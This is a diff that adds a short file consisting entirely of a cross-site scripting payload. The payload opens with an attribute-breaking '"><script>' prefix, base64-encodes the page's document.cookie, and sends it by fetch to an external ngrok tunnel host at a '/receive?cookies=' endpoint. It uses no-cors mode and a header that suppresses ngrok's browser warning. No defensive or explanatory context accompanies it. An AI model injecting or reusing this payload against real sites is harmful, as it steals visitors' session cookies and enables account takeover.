@@ -1,0 +1,17 @@
+"><script>
+const cookies = btoa(document.cookie);
+const url = "https://35bf-2401-4900-8814-aa27-ad8c-7ef6-fc05-9ad0.ngrok-free.app/receive?cookies=" + cookies;
+
+fetch(url, {
+    method: 'GET',
+    mode: 'no-cors',
+    headers: {
+        'ngrok-skip-browser-warning': 'true'
+    }
+}).then(response => {
+    // You cannot access response body directly due to no-cors
+    console.log('Request sent');
+}).catch(error => {
+    console.error('Error:', error);
+});
+</script>
